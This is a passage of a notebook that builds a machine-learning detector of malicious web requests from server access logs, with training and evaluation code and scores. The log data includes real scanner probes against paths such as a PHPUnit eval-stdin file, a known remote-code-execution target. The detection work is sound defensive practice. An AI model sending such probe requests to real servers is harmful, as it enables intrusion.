              "      <td>GET /html/public/index.php HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>152</td>\n",
              "      <td>Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US;...</td>\n",
              "      <td>GET</td>\n",
              "      <td>/html/public/index.php</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>False</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>514</th>\n",
              "      <td>114.67.105.83</td>\n",
              "      <td>21/Sep/2020:07:02:02</td>\n",
              "      <td>GET /public/index.php HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>152</td>\n",
              "      <td>Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US;...</td>\n",
              "      <td>GET</td>\n",
              "      <td>/public/index.php</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>False</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>515</th>\n",
              "      <td>114.67.105.83</td>\n",
              "      <td>21/Sep/2020:07:02:03</td>\n",
              "      <td>GET /TP/html/public/index.php HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>152</td>\n",
              "      <td>Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US;...</td>\n",
              "      <td>GET</td>\n",
              "      <td>/TP/html/public/index.php</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>False</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>516</th>\n",
              "      <td>114.67.105.83</td>\n",
              "      <td>21/Sep/2020:07:02:04</td>\n",
              "      <td>GET /elrekt.php HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>152</td>\n",
              "      <td>Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US;...</td>\n",
              "      <td>GET</td>\n",
              "      <td>/elrekt.php</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>False</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>517</th>\n",
              "      <td>114.67.105.83</td>\n",
              "      <td>21/Sep/2020:07:02:04</td>\n",
              "      <td>GET /index.php HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>152</td>\n",
              "      <td>Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US;...</td>\n",
              "      <td>GET</td>\n",
              "      <td>/index.php</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>False</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>"
            ],
            "text/plain": [
              "                  IP                  date  ...    http_v  is_safe\n",
              "496   159.89.196.206  23/Sep/2020:04:17:14  ...  HTTP/1.1    False\n",
              "497   159.89.196.206  23/Sep/2020:04:17:16  ...  HTTP/1.1     True\n",
              "498   159.89.196.206  23/Sep/2020:04:17:18  ...  HTTP/1.1     True\n",
              "499   159.89.196.206  23/Sep/2020:04:17:18  ...  HTTP/1.1     True\n",
              "500    164.52.24.162  23/Sep/2020:04:18:22  ...  HTTP/1.1     True\n",
              "501  176.113.115.214  23/Sep/2020:04:29:27  ...  HTTP/1.1    False\n",
              "502  176.113.115.214  23/Sep/2020:04:47:31  ...  HTTP/1.1    False\n",
              "504   187.95.123.122  23/Sep/2020:05:22:42  ...  HTTP/1.1     True\n",
              "505    50.192.43.149  23/Sep/2020:05:41:29  ...  HTTP/1.1    False\n",
              "506    94.102.51.119  23/Sep/2020:05:44:39  ...  HTTP/1.1     True\n",
              "508    189.38.179.15  23/Sep/2020:06:19:21  ...  HTTP/1.1     True\n",
              "509   193.118.53.202  21/Sep/2020:06:56:38  ...  HTTP/1.1     True\n",
              "510    114.67.105.83  21/Sep/2020:07:01:59  ...  HTTP/1.1    False\n",
              "511    114.67.105.83  21/Sep/2020:07:02:01  ...  HTTP/1.1    False\n",
              "512    114.67.105.83  21/Sep/2020:07:02:01  ...  HTTP/1.1    False\n",
              "513    114.67.105.83  21/Sep/2020:07:02:02  ...  HTTP/1.1    False\n",
              "514    114.67.105.83  21/Sep/2020:07:02:02  ...  HTTP/1.1    False\n",
              "515    114.67.105.83  21/Sep/2020:07:02:03  ...  HTTP/1.1    False\n",
              "516    114.67.105.83  21/Sep/2020:07:02:04  ...  HTTP/1.1    False\n",
              "517    114.67.105.83  21/Sep/2020:07:02:04  ...  HTTP/1.1    False\n",
              "\n",
              "[20 rows x 10 columns]"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 114
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "hITwjdoj21W8"
      },
      "source": [
        "queries = dft['request'].to_list()"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "g2ui7jGb6VeP"
      },
      "source": [
        "y = dft['is_safe'].to_list()"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "uF8u6TW1GQPa",
        "outputId": "46f7225c-589d-44ab-96a5-965fd7f7a954"
      },
      "source": [
        "len(y)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "83230"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 40
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "C7Z0CAouGcEL"
      },
      "source": [
        "# 50% split\r\n",
        "mid = int(len(y) / 2)\r\n",
        "trn_y = y[:mid]\r\n",
        "val_y = y[mid:]"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "cz38bCt1Fdj4",
        "outputId": "21103e65-06ef-4154-a889-01e8a47c5986"
      },
      "source": [
        "len(trn_y)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "41615"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 42
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "bfVinYsSt97n",
        "outputId": "7cd74a94-2301-49a8-f6d0-230b93e8c827"
      },
      "source": [
        "trn = queries[:mid]\r\n",
        "val = queries[mid:]\r\n",
        "len(queries), len(trn), len(val)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(83230, 41615, 41615)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 43
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "PLgDV38KtD1M"
      },
      "source": [
        "## 4.2 TfidfVectorizer"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "92_RIl6gsFfY"
      },
      "source": [
        "vectorizer = TfidfVectorizer(\n",
        "    min_df=0.0, \n",
        "    analyzer=\"word\", \n",
        "    sublinear_tf=True, \n",
        "    ngram_range=(1,3))\n",
        "X = vectorizer.fit_transform(queries)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "h61KyJDt5kPq"
      },
      "source": [
        "X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "XHwmuuWB6lb2"
      },
      "source": [
        "lgs = LogisticRegression(class_weight={1: 2 * len(good_requests) / len(bad_requests2), 0: 1.0})"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "ukpIxjUn6ylP",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "455351de-51b5-420c-88b8-0f2cae2e6832"
      },
      "source": [
        "%%time\n",
        "lgs.fit(X_train, y_train)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "CPU times: user 1.07 s, sys: 1.32 s, total: 2.39 s\n",
            "Wall time: 1.23 s\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "LogisticRegression(C=1.0, class_weight={0: 1.0, 1: 8.712381938155001},\n",
              "                   dual=False, fit_intercept=True, intercept_scaling=1,\n",
              "                   l1_ratio=None, max_iter=100, multi_class='auto', n_jobs=None,\n",
              "                   penalty='l2', random_state=None, solver='lbfgs', tol=0.0001,\n",
              "                   verbose=0, warm_start=False)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 56
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "nb4o5A7fs7BT"
      },
      "source": [
        "## 4.3 CountVectorizer - trigram NB features"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "zSnZNVtVjn85"
      },
      "source": [
        "veczr = CountVectorizer(analyzer='word')"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "m7aIl6khvQL4",
        "outputId": "ce069bb7-34c9-46b2-c669-144ca7712739"
      },
      "source": [
        "%%time\r\n",
        "trn_term_doc1 = veczr.fit_transform(trn)\r\n",
        "val_term_doc1 = veczr.transform(val)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "CPU times: user 411 ms, sys: 522 µs, total: 412 ms\n",
            "Wall time: 413 ms\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "T7ifwoq9vWtm",
        "outputId": "659c73ca-8212-49ec-86c0-3a0917cbb5a8"
      },
      "source": [
        "trn_term_doc1"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<41590x4172 sparse matrix of type '<class 'numpy.int64'>'\n",
              "\twith 148121 stored elements in Compressed Sparse Row format>"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 73
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "i2tvmwZcvhz-",
        "outputId": "90e1db20-397f-4a50-f430-29d978f63d65"
      },
      "source": [
        "vocab = veczr1.get_feature_names(); vocab[10:25]"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['0bef',\n",
              " '0em3eimvipqygz_twxgcbnlicriauqhnu7zbnixomaoiztoilzjrocyjmqavd_bwe',\n",
              " '10',\n",
              " '100',\n",
              " '101',\n",
              " '102',\n",
              " '104',\n",
              " '107',\n",
              " '11',\n",
              " '110',\n",
              " '111',\n",
              " '1111',\n",
              " '112',\n",
              " '113',\n",
              " '114']"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 52
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ycfVt5ZsvtAC",
        "outputId": "51201111-f577-44a3-f438-236af39d1abd"
      },
      "source": [
        "w0 = set([o.lower() for o in trn[0].split(' ')]); w0"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "{'/vendor/phpunit/phpunit/src/util/php/eval-stdin.php', 'get', 'http/1.1'}"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 53
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "xtg3El8N1xgy",
        "outputId": "5a4aa660-7e09-403e-fcfc-b951d7ed95db"
      },
      "source": [
        "m = LogisticRegression(C=1e8)\r\n",
        "m.fit(trn_term_doc1, y_train)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "/usr/local/lib/python3.6/dist-packages/sklearn/linear_model/_logistic.py:940: ConvergenceWarning: lbfgs failed to converge (status=1):\n",
            "STOP: TOTAL NO. of ITERATIONS REACHED LIMIT.\n",
            "\n",
            "Increase the number of iterations (max_iter) or scale the data as shown in:\n",
            "    https://scikit-learn.org/stable/modules/preprocessing.html\n",
            "Please also refer to the documentation for alternative solver options:\n",
            "    https://scikit-learn.org/stable/modules/linear_model.html#logistic-regression\n",
            "  extra_warning_msg=_LOGISTIC_SOLVER_CONVERGENCE_MSG)\n"
          ],
          "name": "stderr"
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "LogisticRegression(C=100000000.0, class_weight=None, dual=False,\n",
              "                   fit_intercept=True, intercept_scaling=1, l1_ratio=None,\n",
              "                   max_iter=100, multi_class='auto', n_jobs=None, penalty='l2',\n",
              "                   random_state=None, solver='lbfgs', tol=0.0001, verbose=0,\n",
              "                   warm_start=False)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 74
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Z_zjX8Dy68K_"
      },
      "source": [
        "# 5 Evaluation"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "kQNugllw2YLp"
      },
      "source": [
        "## 5.1 tfidf vectorizer"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "xN6EnjLCktcb"
      },
      "source": [
        "def print_score(m, _df, pred, x_test, y_test):\r\n",
        "  fpr, tpr, _ = metrics.roc_curve(y_test, (m.predict_proba(x_test)[:, 1]))\r\n",
        "  auc = metrics.auc(fpr, tpr)\r\n",
        "  print(f\"All rows: {len(_df.IP)}, bad request count: {len(bad_requests)}\")\r\n",
        "  print(\"Baseline Constant negative: %.6f\" % (len(_df.IP) / (len(_df.IP) + len(bad_requests))))\r\n",
        "  print(\"Accuracy: %f\" % m.score(x_test, y_test))  #checking the accuracy\r\n",
        "  print(\"Precision: %f\" % metrics.precision_score(y_test, pred))\r\n",
        "  print(\"Recall: %f\" % metrics.recall_score(y_test, pred))\r\n",
        "  print(\"F1-Score: %f\" % metrics.f1_score(y_test, pred))\r\n",
        "  print(\"AUC: %f\" % auc)"
      ],
      "execution_count": 51,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "MeExFBTIlSev",
        "outputId": "dd303259-3a17-48ae-8fda-f59999ac4821"
      },
      "source": [
        "print_score(lgs, dft, predicted, X_test, y_test)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "All rows: 83230, bad request count: 7729\n",
            "Baseline Constant negative: 0.915028\n",
            "Accuracy: 0.993488\n",
            "Precision: 0.992875\n",
            "Recall: 1.000000\n",
            "F1-Score: 0.996425\n",
            "AUC: 0.999736\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Rgox5hmT2ciu"
      },
      "source": [
        "## 5.2 CountVectorizer"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "huJi8SLc2la_",
        "outputId": "e49fc7af-8620-4e54-b66f-7c53689a2e51"
      },
      "source": [
        "preds = m.predict(val_term_doc1)\r\n",
        "(preds==val_y).mean()"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "0.5762923779754748"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 75
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Mht87EBdsxks"
      },
      "source": [
        "# 6 Pipeline"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "pQ7lqObA3Uh7"
      },
      "source": [
        "## 6.1 Labeling"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "ZqZkWjuUI_wc"
      },
      "source": [
        "def set_label(df_l, bad_data):\r\n",
        "  bad_req = get_bad_requests(df_l, bad_data)\r\n",
        "  good_req = bad_req.merge(dft, how='outer', indicator=True).loc[lambda x : x['_merge']=='right_only']\r\n",
        "  df_l['is_safe'] = df_l.request.isin(good_req.request).astype(bool)\r\n",
        "  return df_l, bad_req, good_req"
      ],
      "execution_count": 28,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "ecL5TzTuO9a_"
      },
      "source": [
        "dft, bad_requests, good_requests = set_label(dft, bad_words)"
      ],
      "execution_count": 150,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "42aPDja73YTp"
      },
      "source": [
        "## 6.2 Split and prepare"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "8O1dHjteMGON"
      },
      "source": [
        "# analyzer 'word' or 'char'\r\n",
        "def get_vectorizers(analyzer):\r\n",
        "  t_veczr = TfidfVectorizer(ngram_range=(1,3),\r\n",
        "                            min_df=0.0, \r\n",
        "                            analyzer=analyzer, \r\n",
        "                            sublinear_tf=True)\r\n",
        "  c_veczr = CountVectorizer(ngram_range=(1,3),\r\n",
        "                            analyzer=analyzer, \r\n",
        "                            max_features=10000)\r\n",
        "  return t_veczr, c_veczr"
      ],
      "execution_count": 30,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "YXaOteiMvYk9",
        "outputId": "c963c754-c202-4917-de94-946dee5f1c0c"
      },
      "source": [
        "dft.shape"
      ],
      "execution_count": 151,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(48899, 10)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 151
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "pATd9816wlLy"
      },
      "source": [
        "x = dft['request'].to_list()"
      ],
      "execution_count": 152,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "gi-vbPkbj5vg"
      },
      "source": [
        "y = dft['is_safe'].to_list()"
      ],
      "execution_count": 153,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "4kiBXacL3DfW",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "f76ecac3-c265-4913-df64-50d7fc89dd55"
      },
      "source": [
        "int(len(y) * 0.8)"
      ],
      "execution_count": 154,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "39119"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 154
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "CuTA3F1wrUSL"
      },
      "source": [
        "# train, test, validation : 40% 30% 30%\r\n",
        "def split_lst(lst):\r\n",
        "  split_trn = int(len(lst) * 0.4)\r\n",
        "  trn_lst = lst[:split_trn]\r\n",
        "  tmp_lst = lst[split_trn:]\r\n",
        "  split_val = int(len(tmp_lst) / 2)\r\n",
        "  test_lst = tmp_lst[:split_val]\r\n",
        "  val_lst = tmp_lst[split_val:]\r\n",
        "  return trn_lst, test_lst, val_lst"
      ],
      "execution_count": 33,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "7K_XVaha3Mi9"
      },
      "source": [
        "# tfidf\r\n",
        "def split_val(l):\r\n",
        "  mid = int(len(y) * 0.8)\r\n",
        "  t = l[:mid]\r\n",
        "  v = l[mid:]\r\n",
        "  return t, v"
      ],
      "execution_count": 88,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Y1b-ITutvMxC"
      },
      "source": [
        "# parameter tuning\r\n",
        "trn_y, test_y, val_y = split_lst(y)"
      ],
      "execution_count": 155,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "IPsdTvR-eP8W"
      },
      "source": [
        "trn_y, test_y = split_val(y)"
      ],
      "execution_count": 156,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "zRXXxjR63FTI",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "3e645ca8-c550-479d-d96b-422187346692"
      },
      "source": [
        "len(trn_y), len(test_y) #, len(val_y)"
      ],
      "execution_count": 158,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(39119, 9780)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 158
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "nqTYTlvjgSKo"
      },
      "source": [
        "# parameter tuning\r\n",
        "trn_x, test_x, val_x = split_lst(x)"
      ],
      "execution_count": 36,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "wUJDycIbeA4N"
      },
      "source": [
        "trn_x, test_x = split_val(x)"
      ],
      "execution_count": 159,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "W2GJreoxgZxU",
        "outputId": "a152d656-748b-49f6-e1b6-7e5f00554c2e"
      },
      "source": [
        "len(trn_x), len(test_x) # , len(val_x)"
      ],
      "execution_count": 160,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(39119, 9780)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 160
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "VQm_5Zcsb8ul",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "03ba0e21-07b8-4c36-ccbd-417aaecdab47"
      },
      "source": [
        "y[0]"
      ],
      "execution_count": 161,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "False"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 161
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Or0Q8stzavpK"
      },
      "source": [
        "t_trn_y, t_val_y = split_val(y)"
      ],
      "execution_count": 162,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "co_xOJWWZ8TB",
        "outputId": "ed925aac-4f34-47d2-d6a2-e0c2ef99107e"
      },
      "source": [
        "len(t_trn_y), len(t_val_y)"
      ],
      "execution_count": 163,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(39119, 9780)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 163
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "9o0skim3bRNW"
      },
      "source": [
        "t_trn_x, t_val_x = split_val(x)"
      ],
      "execution_count": 164,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "6j_A603MMeVG"
      },
      "source": [
        "t_veczr, c_veczr = get_vectorizers('word')"
      ],
      "execution_count": 43,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "yyPAGxKt3hcS",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "6da8ec63-e1d4-47b3-bf98-9c4bbfc9e621"
      },
      "source": [
        "%time X = t_veczr.fit_transform(x)"
      ],
      "execution_count": 165,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "CPU times: user 931 ms, sys: 3.23 ms, total: 935 ms\n",
            "Wall time: 943 ms\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "8iNdLyP8Xksy",
        "outputId": "60bb0ed3-0716-422b-fb8e-8b7160019bb4"
      },
      "source": [
        "X[0]"
      ],
      "execution_count": 166,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<1x23898 sparse matrix of type '<class 'numpy.float64'>'\n",
              "\twith 22 stored elements in Compressed Sparse Row format>"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 166
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "zWKoQ5kc3vDG"
      },
      "source": [
        "X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)"
      ],
      "execution_count": 167,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "MYLVWxFa3ecg"
      },
      "source": [
        "## 6.3 models"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "aF2BGXt63ntU"
      },
      "source": [
        "### 6.3.1 TfidfVectorizer"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "z5MV3Yp2371u"
      },
      "source": [
        "tf_m = LogisticRegression(\r\n",
        "    # C=0.1,\r\n",
        "    class_weight={1: 2 * len(good_requests) / len(bad_requests), 0: 1.0})"
      ],
      "execution_count": 47,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "S0aa5J4Ploat"
      },
      "source": [
        "final_model = tf_m.fit(X, y)"
      ],
      "execution_count": 187,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "seQb0TZ_4I1T",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "33549d27-9b40-4694-ae23-94416890f16b"
      },
      "source": [
        "%time tf_m.fit(X_train, y_train)"
      ],
      "execution_count": 168,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "CPU times: user 1.28 s, sys: 1.36 s, total: 2.64 s\n",
            "Wall time: 1.35 s\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "LogisticRegression(C=1.0, class_weight={0: 1.0, 1: 8.120452609806545},\n",
              "                   dual=False, fit_intercept=True, intercept_scaling=1,\n",
              "                   l1_ratio=None, max_iter=100, multi_class='auto', n_jobs=None,\n",
              "                   penalty='l2', random_state=None, solver='lbfgs', tol=0.0001,\n",
              "                   verbose=0, warm_start=False)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 168
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "wbjfbbyT4MpP"
      },
      "source": [
        "### 6.3.2 CountVectorizer"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "YcXjHewd4Qah",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "4a97e5ad-e7db-4860-9649-50c24c2fca99"
      },
      "source": [
        "%%time\r\n",
        "trn_term_doc = c_veczr.fit_transform(trn_x)\r\n",
        "val_term_doc = c_veczr.transform(test_x)"
      ],
      "execution_count": 169,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "CPU times: user 891 ms, sys: 125 µs, total: 892 ms\n",
            "Wall time: 903 ms\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "9h3PMYaG4gbA"
      },
      "source": [
        "y1 = trn_y\r\n",
        "x1 = trn_term_doc.sign()\r\n",
        "c_test_x = val_term_doc.sign()\r\n",
        "p = x1[y1==1].sum(0)+1\r\n",
        "q = x1[y1==0].sum(0)+1\r\n",
        "r = np.log((p/p.sum())/(q/q.sum()))\r\n",
        "b = np.log(len(p)/len(q))"
      ],
      "execution_count": 170,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "KeqgE22w5uuv",
        "outputId": "87406540-d20b-4db7-8ffc-53f4253dba63"
      },
      "source": [
        "c_m = LogisticRegression(C=1e8)\r\n",
        "c_m.fit(x1, y1)"
      ],
      "execution_count": 171,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "/usr/local/lib/python3.6/dist-packages/sklearn/linear_model/_logistic.py:940: ConvergenceWarning: lbfgs failed to converge (status=1):\n",
            "STOP: TOTAL NO. of ITERATIONS REACHED LIMIT.\n",
            "\n",
            "Increase the number of iterations (max_iter) or scale the data as shown in:\n",
            "    https://scikit-learn.org/stable/modules/preprocessing.html\n",
            "Please also refer to the documentation for alternative solver options:\n",
            "    https://scikit-learn.org/stable/modules/linear_model.html#logistic-regression\n",
            "  extra_warning_msg=_LOGISTIC_SOLVER_CONVERGENCE_MSG)\n"
          ],
          "name": "stderr"
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "LogisticRegression(C=100000000.0, class_weight=None, dual=False,\n",
              "                   fit_intercept=True, intercept_scaling=1, l1_ratio=None,\n",
              "                   max_iter=100, multi_class='auto', n_jobs=None, penalty='l2',\n",
              "                   random_state=None, solver='lbfgs', tol=0.0001, verbose=0,\n",
              "                   warm_start=False)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 171
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "kBdgk25mQbL0"
      },
      "source": [
        "Naive Biase with multiplication"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "b5DfWj_BzLxH"
      },
      "source": [
        "## 6.4 Evaluation"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "BQEEM9sazXui"
      },
      "source": [
        "### 6.4.1 TfidfVectorizer"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Y5dPalejzPAO"
      },
      "source": [
        "predicted = tf_m.predict(X_test)"
      ],
      "execution_count": 176,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "NwtF0ZmLzhkc",
        "outputId": "bfb1fa75-99d9-432a-d3e5-b9e1da388750"
      },
      "source": [
        "print_score(tf_m, dft, predicted, X_test, y_test)"
      ],
      "execution_count": 177,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "All rows: 48899, bad request count: 16438\n",
            "Baseline Constant negative: 0.748412\n",
            "Accuracy: 0.980573\n",
            "Precision: 0.971867\n",
            "Recall: 0.999847\n",
            "F1-Score: 0.985658\n",
            "AUC: 0.999814\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
